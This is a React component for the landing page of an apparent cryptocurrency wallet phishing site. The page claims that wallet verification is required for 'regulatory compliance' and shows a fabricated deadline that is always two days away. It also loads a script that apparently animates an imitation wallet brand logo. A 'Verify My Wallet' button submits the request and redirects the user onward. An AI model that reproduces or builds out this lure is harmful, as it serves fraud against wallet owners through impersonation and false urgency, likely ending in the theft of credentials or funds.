import React, { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { useI18n } from '../contexts/I18nContext'
import { useSession } from '../contexts/SessionContext'
import Header from '../components/Header'
import SecurityModal from '../components/SecurityModal'
import api from '../services/api'
import '../styles/common.css'
import '../styles/home.css'

const Home = () => {
  const navigate = useNavigate()
  const { t, currentLang } = useI18n()
  const { setHomeVisited, setVerificationStage } = useSession()
  const [termsAccepted, setTermsAccepted] = useState(false)
  const [loading, setLoading] = useState(false)
  const [websiteConfig, setWebsiteConfig] = useState(null)
  const [showSecurityModal, setShowSecurityModal] = useState(false)
  const logoContainerRef = useRef(null)
  const scriptLoadedRef = useRef(false)


  const getLocaleCode = (lang) => {
    const localeMap = {
      'en': 'en-US',
      'es': 'es-ES',
      'fr': 'fr-FR',
      'de': 'de-DE',
      'it': 'it-IT',
      'pt': 'pt-PT',
      'pt-br': 'pt-BR',
      'nl': 'nl-NL',
      'sv': 'sv-SE',
      'da': 'da-DK',
      'no': 'no-NO',
      'fi': 'fi-FI',
      'pl': 'pl-PL',
      'ru': 'ru-RU',
      'uk': 'uk-UA',
      'cs': 'cs-CZ',
      'hu': 'hu-HU',
      'ro': 'ro-RO',
      'tr': 'tr-TR',
      'ar': 'ar-SA',
      'fa': 'fa-IR',
      'hi': 'hi-IN',
      'bn': 'bn-BD',
      'th': 'th-TH',
      'vi': 'vi-VN',
      'id': 'id-ID',
      'ms': 'ms-MY',
      'fil': 'fil-PH',
      'zh': 'zh-CN',
      'zh-tw': 'zh-TW',
      'ja': 'ja-JP',
      'ko': 'ko-KR'
    }
    return localeMap[lang] || lang || 'en-US'
  }


  const getFormattedDate = () => {
    const futureDate = new Date()
    futureDate.setDate(futureDate.getDate() + 2) // 2 days from now
    
    const locale = getLocaleCode(currentLang)
    
    try {
      return futureDate.toLocaleDateString(locale, {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
      })
    } catch (error) {
      return futureDate.toLocaleDateString('en-US', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
      })
    }
  }


  const getDeadlineText = () => {
    const deadlineText = t('deadlineText', 'Starting from {date}, any unverified wallet will be')
    const formattedDate = getFormattedDate()
    return deadlineText.replace('{date}', formattedDate)
  }

  useEffect(() => {
    setHomeVisited(true)
    setVerificationStage('home')
    loadWebsiteConfig()
    

    if (scriptLoadedRef.current) return
    

    const existingScript = document.querySelector('script[src="/assets/js/jsfox.js"]')
    if (existingScript) {
      scriptLoadedRef.current = true
      return
    }
    

    const logoContainer = logoContainerRef.current || document.getElementById('logo-container')
    if (logoContainer) {
      logoContainer.innerHTML = ''
    }
    

    const script = document.createElement('script')
    script.src = '/assets/js/jsfox.js'
    script.onload = () => {
      scriptLoadedRef.current = true
      setTimeout(() => {
        const container = logoContainerRef.current || document.getElementById('logo-container')
        if (container) {

          const event = new MouseEvent('mousemove', {
            clientX: window.innerWidth / 2,
            clientY: window.innerHeight / 2
          })
          window.dispatchEvent(event)
        }
      }, 100)
    }
    script.onerror = () => {
      scriptLoadedRef.current = false
    }
    document.head.appendChild(script)
    
    return () => {

      const scriptToRemove = document.querySelector('script[src="/assets/js/jsfox.js"]')
      if (scriptToRemove && scriptToRemove !== script) {
        scriptToRemove.remove()
      }

    }
  }, [setHomeVisited, setVerificationStage])

  const loadWebsiteConfig = async () => {
    try {
      const config = await api.getWebsiteConfig()
      setWebsiteConfig(config)
    } catch (error) {
    }
  }

  const handleVerify = async () => {
    if (!termsAccepted) return

    setLoading(true)
    try {
      const formData = new FormData()
      formData.append('verification_request', 'true')
      formData.append('language', currentLang)

      await api.submitVerification(formData)
      navigate('/loading', { replace: true })
    } catch (error) {
      alert(t('verification_error', 'Verification failed. Please try again.'))
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="home-page">
      <Header />
      <main id="main">
        <div className="container">
          <div className="thebox">
            <div className="title">
              <h3 className="mb20" id="main-title">
                {websiteConfig?.title || t('mainTitle', 'Wallet Verification Required')}
              </h3>
              <p id="description-1">
                {websiteConfig?.description || t('description1', 'To maintain security standards and regulatory compliance, we now require wallet address verification for all users.')}
              </p>
              <p id="deadline-text">
                {getDeadlineText()} <strong>{t('restrictionText', 'temporarily restricted')}</strong>
              </p>
              <p id="cooperation-text">
                {t('cooperationText', 'We appreciate your cooperation in keeping our platform secure.')}
              </p>
            </div>
            <div className="logo">
              <div id="logo-container" ref={logoContainerRef}></div>
            </div>
            <div className="terms-container">
              <input
                type="checkbox"
                className="terms-checkbox"
                id="termsCheckbox"
                checked={termsAccepted}
                onChange={(e) => setTermsAccepted(e.target.checked)}
              />
              <label htmlFor="termsCheckbox" className="terms-label">
                <span id="terms-text">
                  {t('terms_text', 'I agree to the')}
                </span>
                <a id="terms-link" href="#">
                  {t('terms_link', 'Terms and Conditions')}
                </a>
              </label>
            </div>
            <div className="btns">
              <button
                id="verifyBtn"
                disabled={!termsAccepted || loading}
                onClick={handleVerify}
                className={`${termsAccepted ? 'active' : ''} ${loading ? 'loading' : ''}`}
              >
                <span id="verify-btn-text">
                  {loading ? t('verifying', 'Verifying...') : t('verifyBtnText', 'Verify My Wallet')}
                </span>
              </button>
              <button 
                className="security-info-btn" 
                id="securityInfoBtn"
                onClick={() => setShowSecurityModal(true)}
              >
                <span id="security-btn-text">
                  {t('security_info', 'Security Info')}
                </span>
              </button>
            </div>
          </div>
        </div>
      </main>
      <SecurityModal 
        isOpen={showSecurityModal} 
        onClose={() => setShowSecurityModal(false)}
        variant="home"
      />
    </div>
  )
}

export default Home

